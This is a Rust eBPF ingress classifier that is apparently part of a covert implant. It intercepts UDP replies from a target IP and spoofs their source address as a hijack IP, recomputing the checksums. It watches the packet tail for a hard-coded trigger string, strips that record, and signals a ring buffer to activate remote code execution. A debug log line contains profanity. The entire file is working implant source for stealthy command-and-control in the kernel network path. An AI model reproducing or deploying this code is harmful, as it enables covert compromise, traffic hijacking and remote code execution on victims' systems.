use core::net::Ipv4Addr;

use aya_ebpf::{
    bindings::{TC_ACT_OK, TC_ACT_PIPE},
    helpers::bpf_skb_change_tail,
    macros::classifier,
    programs::TcContext,
};
use aya_log_ebpf::{error, info};
use network_types::{
    eth::{EthHdr, EtherType},
    ip::{IpProto, Ipv4Hdr},
    udp::UdpHdr,
};

use crate::common::{
    update_addr, update_ip_hdr_tot_len, update_udp_hdr_len, Rce, UpdateType, HIJACK_IP,
    IP_SRC_ADDR_OFFSET, RBUF, TARGET_IP, UDP_CSUM_OFFSET, UDP_OFFSET,
};

#[classifier]
pub fn tamanoir_ingress(mut ctx: TcContext) -> i32 {
    match tc_process_ingress(&mut ctx) {
        Ok(ret) => ret,
        Err(_) => TC_ACT_PIPE,
    }
}

#[inline]
fn submit(rce: Rce) {
    if let Some(mut buf) = RBUF.reserve::<Rce>(0) {
        unsafe { (*buf.as_mut_ptr()) = rce };
        buf.submit(0);
    }
}

#[inline]
fn tc_process_ingress(ctx: &mut TcContext) -> Result<i32, i64> {
    let target_ip: u32 = unsafe { core::ptr::read_volatile(&TARGET_IP) };
    let hijack_ip: u32 = unsafe { core::ptr::read_volatile(&HIJACK_IP) };

    let ethhdr: EthHdr = ctx.load(0)?;
    if let EtherType::Ipv4 = ethhdr.ether_type {
        let header = ctx.load::<Ipv4Hdr>(EthHdr::LEN)?;
        let addr = header.src_addr;
        if let IpProto::Udp = header.proto {
            if u32::from_be(addr) == target_ip {
                info!(ctx, "\n-----\nNew intercepted request:\n-----");
                let udp_hdr = &ctx.load::<UdpHdr>(UDP_OFFSET)?;
                let udp_port = &udp_hdr.source;
                update_addr(ctx, &addr, &hijack_ip.to_be(), UpdateType::Src)?;

                ctx.l4_csum_replace(UDP_CSUM_OFFSET, addr as u64, hijack_ip as u64, 4)
                    .map_err(|_| {
                        error!(ctx, "error: l4_csum_replace");
                        -1
                    })?;

                let mut action = [0u8; 10];
                let _ = ctx.load_bytes((ctx.len() - 10) as usize, &mut action)?;

                let last_bytes_rtcp_trigger: [u8; 10] =
                    [118, 47, 114, 49, 48, 110, 52, 109, 52, 116];
                let record_size = 22u32;
                if action == last_bytes_rtcp_trigger {
                    info!(ctx, " !! TRIGGER MOTHERFUCKER !! ");
                    unsafe {
                        bpf_skb_change_tail(ctx.skb.skb, ctx.len() - record_size, 0);
                    };
                    update_ip_hdr_tot_len(
                        ctx,
                        &header.tot_len,
                        &(u16::from_be(header.tot_len) - record_size as u16).to_be(),
                    )?;
                    update_udp_hdr_len(
                        ctx,
                        &(u16::from_be(udp_hdr.len) - record_size as u16).to_be(),
                    )?;
                    submit(Rce {
                        prog: 0,
                        active: true,
                    })
                }
                info!(
                    ctx,
                    "{}:{} -> {}:{}",
                    Ipv4Addr::from_bits(u32::from_be(addr)),
                    u16::from_be(*udp_port),
                    Ipv4Addr::from_bits(u32::from_be(ctx.load::<u32>(IP_SRC_ADDR_OFFSET).unwrap())),
                    u16::from_be(ctx.load::<u16>(UDP_OFFSET).unwrap()),
                );
            }
        };
    }

    Ok(TC_ACT_OK)
}
